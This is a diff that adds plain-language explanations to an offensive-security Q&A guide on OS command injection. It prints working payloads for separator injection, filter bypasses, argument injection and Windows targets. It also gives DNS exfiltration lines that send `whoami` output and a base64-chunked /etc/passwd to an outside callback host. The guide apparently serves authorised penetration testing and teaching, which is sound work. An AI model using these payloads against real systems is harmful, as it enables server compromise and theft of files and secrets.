@@ -42,6 +42,8 @@
 ### Q1. What is OS command injection?
 A flaw where user input is concatenated into a string that the application passes to an **operating-system shell** (or to a program with shell-style argument parsing), letting an attacker run their own commands on the server. The classic sink: `system("ping " + userHost)` with `userHost = "127.0.0.1; id"` runs `id`. The result is **Remote Code Execution (RCE)** — usually **Critical (CVSS ~9.8)**.
 
+> *Plain version:* the app is like a **clerk dictating a command to a robot that obeys every sentence.** It means to say `ping <your input>`, but you type `127.0.0.1; id`, so the clerk dictates *two* commands and the robot runs both. The `;` is punctuation that ends its command and starts yours. "RCE" (remote code execution) = you can run programs on their server — the top of the severity scale, because from there you reach their files, secrets, database, and cloud account.
+
 ### Q2. How is it different from code injection, SSTI, SQLi, and argument injection?
 - **OS command injection (CWE-78):** input reaches an OS shell → you run shell commands.
 - **Code injection (CWE-94):** input is evaluated by the app's *language* (`eval`) → you run app code (may then call the OS).
@@ -63,8 +65,12 @@ Because "your command runs on the server" = full server compromise: read source/
 - **OOB (blind):** no output/delay reflected, but the server can make a **DNS/HTTP** request you observe.
 Most **real** command injection is **blind** — the app doesn't echo command output. If you only test in-band, you miss the majority. Always run the time and OOB probes.
 
+> *Plain version:* three ways to *tell* the command ran. **In-band** = the app prints the answer back to you (you literally read `whoami`'s output). **Time-based** = it prints nothing, so you order a 10-second nap (`sleep 10`) and watch for the response to arrive 10s late. **OOB** = nothing printed and no useful delay, so you make the server *call a phone number you own* (a DNS/HTTP listener) and check your call log. The trap for beginners: they only look for in-band output, see none, and declare it safe — but the command was running silently the whole time.
+
 ### Q6. What's the single most important mindset?
 **Prove execution, not a reflected character.** Seeing your `;` or `|` echoed back is *not* a finding. The bug exists only when a command actually **runs** — evidenced by command output, a *repeated* timing delay vs baseline, or a server-sourced OOB callback carrying your marker.
+
+> *Plain version:* the app *displaying* your `;` back on the page proves nothing — that just means it echoed your text, not that a shell ran it. Don't confuse "my weird character showed up" with "a command executed." You only have a bug when you can point to something a command *did*: real output, a reliable delay, or a call to your listener.
 
 ### Q7. Which shell metacharacters/operators matter?
 `;` (run next), `|` (pipe), `||` (run if previous fails), `&` (background+run next), `&&` (run if previous succeeds), `` `cmd` `` and `$(cmd)` (command substitution), and a **newline** (`%0a`). On Windows: `&`, `&&`, `|`, `||`. These are how you break out of the intended command and append yours.
@@ -94,6 +100,8 @@ Deterministic values the app can't produce by itself: `echo CMDI-<rand>`, `$(ech
 
 ### Q13. How do I tell command injection apart from SSRF?
 If the server **fetches a URL** you supplied but doesn't run a shell command → that's **SSRF** (separate kit). If your payload makes the server **execute a command** (output/delay/OOB callback triggered by `;cmd`) → command injection. The discriminator is "did a *command* run?" not "did the server make a request?".
+
+> *Plain version:* both can make the server "phone home," so people mix them up. The test: did the server *fetch a web address* (that's SSRF — it only makes HTTP requests where you point it), or did it *run a program* (that's command injection — far more powerful, you run anything)? A DNS callback from `;nslookup x.oob` means a **command** ran; a callback from the server following a URL you gave a "fetch" feature is just SSRF.
 
 ### Q14. No output appears — does that mean it's safe?
 No. Silence almost always means **blind**, not safe. Run the **time** probe (`;sleep 10`, repeated) and the **OOB** probe (`;nslookup x.oob`) before concluding anything. Blind command injection is the common case.
@@ -140,6 +148,8 @@ A literal newline is a command separator in most shells **regardless of quoting*
 ### Q23. Why does the injection *context* matter (quotes/parens)?
 Where your input lands decides what you must emit first to break out. If it's inside `"…"` you must close the `"`; inside `'…'` you must close the `'` (and `$()`/`` ` `` don't expand inside single quotes until you close them); inside `$()` you must balance parens. Getting the context right is why a "filtered" target still pops.
 
+> *Plain version:* the app might wrap your input in quotes — `ping "<you>"`. Your `;id` is now *inside* the quotes, treated as part of the hostname, so nothing runs. You first have to **close the quote** the app opened (`127.0.0.1"; id; "`) so your command lands outside it. It's like the app put your words in air-quotes; you have to "un-air-quote" before the shell treats them as a command. Single quotes are stricter — `$()` and backticks stay inert until you close the `'`.
+
 ### Q24. How do I find which quote I'm inside?
 Send `127.0.0.1'` and `127.0.0.1"` **separately**. Whichever causes a shell/parse error (or changes behavior) tells you the quote you're in. Then prepend the matching closer:
 ```
@@ -161,6 +171,8 @@ Binary-search each character (or compare ASCII ranges) to recover a value slowly
 
 ### Q27. How does OOB detection work, and why is DNS the best channel?
 Make the server reach **your** host: `;nslookup CMDI.<id>.oast.pro` (DNS) or `;curl http://<id>.oast.pro/CMDI` (HTTP). A hit at interactsh from the **server IP** confirms blind execution. **DNS often escapes egress filters that block outbound HTTP**, so it's the most reliable confirmation and exfil channel.
+
+> *Plain version:* you run a free listener (interactsh/Collaborator) that gives you a unique address like `abc.oast.pro` and logs anyone who contacts it. Inject `nslookup abc.oast.pro` — a DNS lookup — and if your log shows a hit *from the target's IP*, the command ran. Why DNS over HTTP? Firewalls routinely block servers from making outbound web requests but almost always allow DNS lookups (the internet breaks without them), so a DNS callback sneaks out where an HTTP one wouldn't.
 
 ### Q28. How do I set up an OOB listener?
 Run `interactsh-client -v` (it prints your unique `*.oast.pro` host and logs DNS+HTTP with source IP), or use **Burp Collaborator**. Put the unique host in your payloads; poll for interactions. (See the kit's `poc/oob_listen.md`.)
@@ -185,6 +197,8 @@ For each payload, check: (a) the marker string in the response (in-band), (b) a 
 No. Filtered command injection is still Critical once you evade. Route around the specific block: spaces, keywords, separators, slashes — each has a canonical bypass. Work one layer at a time and combine.
 
 ### Q34. Spaces are blocked — how do I run `cat /etc/passwd`?
+> *Plain version:* the filter bans the space character, but the shell has other ways to read "gap between words." `${IFS}` is a built-in variable that *is* whitespace (Internal Field Separator), so `cat${IFS}/etc/passwd` runs exactly like `cat /etc/passwd` — no literal space typed. Brace expansion `{cat,/etc/passwd}` and input-redirection `<` are alternate no-space forms. Same command, different spelling, invisible to a "no spaces" rule.
+
 ```
 cat${IFS}/etc/passwd        cat$IFS$9/etc/passwd        {cat,/etc/passwd}        cat</etc/passwd
 X=$'\t';cat${X}/etc/passwd  (use a tab via a var)        %09 (tab) in the request
@@ -241,6 +255,8 @@ Rebuild the command from pieces so no signatured substring appears: quote/backsl
 ### Q47. What is argument/option injection (CWE-88)?
 When your input becomes a **single argument** to a program (not the whole command), so you can't add a separator — **but you can inject flags** that change the program's behavior. The program does exactly what its options say, so a "safe" parameterized exec can still become file-write/SSRF/RCE.
 
+> *Plain version:* sometimes the developer did it "safely" — your input is handed to one program as a single word, with no shell to break, so `;` is dead. But every command-line program obeys its own **flags** (words starting with `-`). If your input *becomes* a flag, the program does what the flag says. Feed `curl` a `-o` and it writes a file instead of downloading; feed `tar` a `--checkpoint-action=exec=` and it runs a command. You're not breaking out of a sentence — you're reprogramming the one tool you're allowed to talk to. (CWE-88, the "sneaky sibling" of classic command injection.)
+
 ### Q48. When does it apply?
 When the sink is `exec(["tool", userInput])` / `tool $userInput` with separators escaped or stripped, **and** the value can start with `-` (or you can sneak one in). Identify the tool (from errors/behavior/source) and reach for its dangerous options.
 
@@ -277,6 +293,8 @@ find:  -exec id \;     sed: s/x/y/e (GNU)     awk 'BEGIN{system("id")}'
 ### Q53. ImageMagick "ImageTragick" (CVE-2016-3714)?
 Many apps resize/convert uploads with ImageMagick. A crafted MVG/MSL/SVG abuses **delegate** commands (`url`/`https`/`ephemeral`/`|`) → RCE on processing. Upload an image that triggers a delegate and pings your collaborator. (Cross-ref the FileUpload kit to get the file accepted.)
 
+> *Plain version:* ImageMagick is the library tons of sites use to resize your uploaded photo. To handle certain formats it shells out to helper programs ("delegates") — and in 2016 someone realised a booby-trapped image file could smuggle a command into that shell-out (nicknamed "ImageTragick"). So a totally normal "upload a profile picture" feature became RCE, with no visible command box anywhere. That's why any *upload → convert* feature is a command-injection suspect, not just ping/lookup boxes.
+
 ### Q54. Ghostscript RCE?
 PDF/EPS/PS rendering (often via ImageMagick's PDF delegate) hits Ghostscript. `-dSAFER` bypasses and `%pipe%` (CVE-2018-16509, CVE-2023-36664) → RCE when a document is converted/thumbnailed. Match the version to the PoC; prove with a benign OOB curl.
 
@@ -298,6 +316,8 @@ PHP `system/exec/shell_exec/passthru/popen/proc_open/`backticks; Python `os.syst
 
 ### Q59. How is Windows command injection different?
 Different shell semantics. Most "Linux didn't work" cases are **Windows targets**. `sh` operators/`sleep` do nothing; use `cmd.exe`/PowerShell syntax. Detect with `&ver` / `&echo %OS%` (cmd) and `;$PSVersionTable` (PowerShell). Comments are `::`/`rem` (not `#`), and `%VAR%` expands at parse time.
+
+> *Plain version:* Windows speaks a different command language than Linux, so Linux payloads (`;id`, `sleep`) silently do nothing — and beginners wrongly quit. Before concluding "not vulnerable," try the Windows dialect: `&whoami`, `&ver` (its version banner), `& ping -n 10 127.0.0.1` (its way to make a 10s delay). If those fire, it's Windows and you just needed the right words.
 
 ### Q60. cmd.exe separators?
 `&` (run next), `&&` (run if previous succeeded), `|` (pipe), `||` (run if previous failed — great for blind on a bad host). E.g. `127.0.0.1 & whoami`, `127.0.0.1 || whoami`.
@@ -360,6 +380,9 @@ For **bug bounty**, a single `id`/`whoami` (or an OOB callback carrying `$(whoam
 
 ### Q71. How do I exfiltrate data blind via DNS?
 Put command output in the callback hostname; chunk for DNS label limits (63 chars/label, 253 total):
+
+> *Plain version:* a bare "the server called my listener" is proof it ran *something* — but you can do better and make the call *carry the answer*. `$(whoami)` runs first and its output becomes part of the hostname looked up: `nslookup $(whoami).oob` turns into a lookup for `root.oob`, so your log now literally shows the server's username. For bigger data (a whole file), base64-encode it and split into ≤63-character chunks (DNS's max label size) across several lookups, then reassemble and decode on your side.
+
 ```
 ;nslookup $(whoami).YOUR.oast.fun
 ;for c in $(cat /etc/passwd|base64|tr -d '='|fold -w60); do nslookup $c.YOUR.oast.fun; done
